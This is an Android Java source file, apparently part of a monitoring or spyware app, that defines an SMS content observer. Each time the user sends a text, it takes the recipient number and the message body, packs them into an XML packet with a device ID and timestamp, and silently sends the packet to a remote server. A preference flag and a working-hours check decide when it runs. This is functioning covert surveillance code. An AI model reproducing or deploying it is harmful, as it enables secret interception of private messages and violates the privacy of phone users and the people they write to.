package com.inet.android.sms;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.bs.FileLog;
import com.inet.android.bs.Request;
import com.inet.android.bs.WorkTimeDefiner;

public class SmsSentObserver extends ContentObserver {

	private static final String TAG = "SMSTRACKERopa";
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	String dir = null;
	SharedPreferences sp;
	private Context mContext;
	Request req;
	private static long id = 0;

	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		dir = "исх. Sms";
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		String sms = sp.getString("KBD", "0");

		if (sms.equals("0")) {
			Log.d(TAG, "KBD = 0");
			FileLog.writeLog("sms: KBD = 0");
			return;
		}

		boolean isWork = WorkTimeDefiner.isDoWork(mContext);
		if (!isWork) {
			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(TAG, "after isWork retrun 0");
			FileLog.writeLog("sms: isWork return " + Boolean.toString(isWork));
			FileLog.writeLog("sms: after isWork retrun 0");

			return;
		} else {
			Log.d(TAG, Boolean.toString(isWork));
			FileLog.writeLog("sms out: " + Boolean.toString(isWork));
		}

		try {
			Log.e(TAG, "Notification on SMS observer");
			FileLog.writeLog("smsSentObserver: Notification on SMS observer");

			Cursor sms_sent_cursor = mContext.getContentResolver().query(
					STATUS_URI, null, null, null, null);
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					String protocol = sms_sent_cursor.getString(sms_sent_cursor
							.getColumnIndex("protocol"));

					Log.e(TAG, "protocol : " + protocol);
					FileLog.writeLog("smsSentObserver: protocol : " + protocol);

					if (protocol == null) {
						// String[] colNames = sms_sent_cursor.getColumnNames();
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));

						Log.e(TAG, "SMS Type : " + type);
						FileLog.writeLog("smsSentObserver: SMS Type : " + type);

						if (type == 2) {
							long messageId = sms_sent_cursor
									.getLong(sms_sent_cursor
											.getColumnIndex("_id"));
							// проверяем не обрабатывали ли мы это сообщение
							// только-что
							if (messageId != id) {
								id = messageId;
								int threadId = sms_sent_cursor
										.getInt(sms_sent_cursor
												.getColumnIndex("thread_id"));
								Cursor c = mContext.getContentResolver().query(
										Uri.parse("content://sms/outbox/"
												+ threadId), null, null, null,
										null);
								c.moveToNext();
								String sendStr = "<packet><id>"
										+ sp.getString("ID", "ID")
										+ "</id><time>"
										+ logTime()
										+ "</time><type>4</type><app>"
										+ dir
										+ "</app><ttl>"
										+ sms_sent_cursor
												.getString(sms_sent_cursor
														.getColumnIndex("address"))
										+ "</ttl><cdata1>"
										+ sms_sent_cursor
												.getString(sms_sent_cursor
														.getColumnIndex("body"))
										+ "</cdata1><ntime>" + "30"
										+ "</ntime></packetSentObserver>";

								req = new Request(mContext);
								req.sendRequest(sendStr);

								Log.d(TAG, sendStr);
								FileLog.writeLog("smsSentObserver: " + sendStr);

								/*
								 * if(colNames != null){ for(int k=0;
								 * k<colNames.length; k++){ Log.e(TAG,
								 * "colNames["+k+"] : " + colNames[k]); } }
								 */
								sms_sent_cursor.close();
							}
						}
					}
				}
			} else
				Log.e(TAG, "Send Cursor is Empty");
			FileLog.writeLog("smsSentObserver: Send Cursor is Empty");
		} catch (Exception sggh) {
			Log.e(TAG, "Error on onChange : " + sggh.toString());
			FileLog.writeLog("smsSentObserver: Error on onChange : "
					+ sggh.toString());
		}
		super.onChange(selfChange);
	}// fn onChange

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}
}// End of class SmsSentObserver
